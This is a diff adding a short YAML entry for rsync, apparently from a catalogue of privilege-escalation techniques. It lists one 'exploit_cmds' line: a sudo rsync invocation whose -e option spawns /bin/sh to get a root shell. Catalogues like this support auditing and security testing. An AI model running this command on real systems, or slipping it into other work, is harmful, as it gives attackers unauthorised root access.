@@ -1,0 +1,4 @@
+name: rsync
+binary_path: /usr/bin/rsync
+exploit_cmds:
+- sudo /usr/bin/rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
